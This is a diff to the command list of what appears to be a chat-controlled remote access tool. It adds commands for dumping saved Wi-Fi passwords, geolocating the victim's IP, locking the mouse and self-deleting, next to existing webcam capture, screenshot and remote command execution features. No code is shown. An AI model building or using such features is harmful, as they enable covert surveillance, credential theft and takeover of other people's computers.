@@ -8,6 +8,10 @@ shutdown - Shut down the PC.
 fakeshutdown - Fake system shutdown.
 altf4 - Simulate Alt + F4.
 clear - Removes all cv2 windows, closes webcam and removes temporary files.
+selfdestruction - Removes the program from the machine permanently.
+🌐 Network & Remote Access
+wifiinfo - Dump saved Wi-Fi SSIDs and passwords.
+ipinfo - Get public IP and geolocation.
 📸 Camera & Screen
 selfie - Take a webcam selfie.
 screenshot - Capture screen.
@@ -40,9 +44,11 @@ setvideowallpaper - Sets a video as wallpaper.
 execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
 terminateprocess - Kills a process by name.
+🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
 capslock - Activates capslock.
 mousecontroller - Sends a mouse controlling menu.
+mouselock - Locks the mouse in position.
 📋 Messaging
 bsend - Send custom text.
 id - Get Owner Chat ID.
